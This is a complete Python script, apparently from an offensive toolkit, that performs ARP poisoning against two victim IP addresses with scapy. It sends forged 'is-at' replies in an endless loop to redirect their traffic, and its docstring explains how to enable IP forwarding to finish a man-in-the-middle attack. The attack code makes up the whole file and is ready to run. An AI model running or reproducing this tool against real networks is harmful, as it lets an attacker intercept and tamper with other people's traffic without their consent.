#!/usr/bin/env python3

import logging
import time

import click

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import ARP, Ether, conf, getmacbyip, sendp


@click.command()
@click.argument('victim1')
@click.argument('victim2')
@click.option('-i', 'iface', default=None, help='Interface to use')
@click.option('-v', 'verbose', is_flag=True, default=False, help='Verbose')
def cmd_arpoison(victim1, victim2, iface, verbose):
    """Send ARP 'is-at' packets to each victim, poisoning their
    ARP tables for send the traffic to your system.

    Note: If you want a full working Man In The Middle attack, you need
    to enable the packet forwarding on your operating system to act like a
    router. You can do that using:

    # echo 1 > /proc/sys/net/ipv4/ip_forward

    Example:

    \b
    # habu.arpoison 192.168.0.1 192.168.0.77
    Ether / ARP is at f4:96:34:e5:ae:1b says 192.168.0.77
    Ether / ARP is at f4:96:34:e5:ae:1b says 192.168.0.70
    Ether / ARP is at f4:96:34:e5:ae:1b says 192.168.0.77
    ...
    """

    conf.verb = False

    if iface:
        conf.iface = iface

    mac1 = getmacbyip(victim1)
    mac2 = getmacbyip(victim2)

    pkt1 = Ether(dst=mac1)/ARP(op="is-at", psrc=victim2, pdst=victim1, hwdst=mac1)
    pkt2 = Ether(dst=mac2)/ARP(op="is-at", psrc=victim1, pdst=victim2, hwdst=mac2)

    try:
        while 1:
            sendp(pkt1)
            sendp(pkt2)

            if verbose:
                pkt1.show2()
                pkt2.show2()
            else:
                print(pkt1.summary())
                print(pkt2.summary())

            time.sleep(1)

    except KeyboardInterrupt:
        pass

if __name__ == '__main__':
    cmd_arpoison()
